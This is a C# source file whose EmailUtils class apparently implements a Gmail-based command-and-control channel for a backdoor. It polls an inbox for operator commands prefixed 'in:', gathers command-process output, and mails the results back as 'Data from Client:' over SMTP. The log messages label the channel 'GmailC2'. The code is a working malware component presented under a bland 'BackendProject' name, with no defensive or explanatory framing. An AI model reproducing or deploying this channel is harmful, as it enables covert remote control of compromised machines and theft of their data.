using System.Net;
using System.Net.Mail;
using System.Text;
using System.Diagnostics;
using EAGetMail;

namespace BackendProject
{
    public class EmailUtils
    {
        public bool enableSSL = true;
        public int Flag = 1;
        public int wait = 5;
        public int SendPortNumber = 587;
        public string strConcat = string.Empty;
        public string body = string.Empty;
        public string smtpAddress = "smtp.gmail.com";
        public string imapAddress = "imap.gmail.com";
        public string emailFromAddress = "Operator@gmail.com";
        public string password = "password";
        public string emailToAddress = "receiver@gmail.com";
        public string subject = "Data from Client:";

        public EmailUtils(string mailoperator, string mailreceiver, string mailoperatorpassword)
        {
            emailFromAddress = mailoperator;
            emailToAddress = mailreceiver;
            password = mailoperatorpassword;
        }

        public void SendEmail(string text)
        {
            using (MailMessage mail = new())
            {
                mail.From = new System.Net.Mail.MailAddress(emailFromAddress);
                mail.To.Add(emailToAddress);
                mail.Subject = subject;
                mail.Body = text;
                mail.IsBodyHtml = true;

                using (SmtpClient smtp = new(smtpAddress, SendPortNumber))
                {
                    smtp.Credentials = new NetworkCredential(emailFromAddress, password);
                    smtp.EnableSsl = enableSSL;
                    smtp.Send(mail);
                }
            }
        }

        // Read last Email from a list of all Emails in the Inbox
        public string[] ReadLastEmail(MailClient oClient, MailServer oServer, List<string> list_emails)
        {
            oClient.Connect(oServer);

            // retrieve unread/new email only
            oClient.GetMailInfosParam.Reset();
            oClient.GetMailInfosParam.GetMailInfosOptions = GetMailInfosOptionType.NewOnly;

            MailInfo[] infos = oClient.GetMailInfos();

            // Only the last (recent/latest) Email
            for (int i = infos.Length - 1; i > infos.Length - 2; i--)
            {
                MailInfo info = infos[i];

                Mail oMail = oClient.GetMail(info);

                if (oMail.TextBody.ToString()[..3].Equals("in:"))
                {
                    list_emails.Add(oMail.TextBody);
                    list_emails.Add("\nSubject of Mail Sent by Operator: " + oMail.Subject);

                    //Console.WriteLine("[*] Text Body: {0}", oMail.TextBody);

                    // mark unread email as read, next time this email won't be retrieved again
                    if (!info.Read)
                        oClient.MarkAsRead(info, true);
                    //New Mail Exists
                    Flag = 0;
                }
                else
                    // Just sending string: "None" to get away from causing "System.ArgumentOutOfRangeException" when string.Substring is used to parse string.
                    list_emails.Add("None");
            }
            return list_emails.ToArray();
        }

        public string[] ReadEmail()
        {
            return ReadLastEmail(new MailClient("TryIt"), new MailServer(imapAddress, emailToAddress, password, ServerProtocol.Imap4)
            {
                // Enabling SSL Connection
                SSLConnection = true,
                Port = 993
            }, new List<string>());
        }

        public void GmailC2Prompt(string command)
        {
            CustomLogger.LoggerAccessor.LogInfo("[EmailUtils] - [GmailC2] Command Sent: {0}", command);
        }

        public void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new();

            if (!string.IsNullOrEmpty(outLine.Data))
            {
                strOutput.Append(outLine.Data);

                strConcat += strOutput.ToString() + "<br />";
            }
        }

        public void WaitForCommand(int sec)
        {
            while (sec >= 0)
            {
                CustomLogger.LoggerAccessor.LogInfo("[EmailUtils] - Waiting for {0} seconds for the Operator to send Command", sec);
                Thread.Sleep(sec * 1000);
                sec--;
            }
        }
    }
}
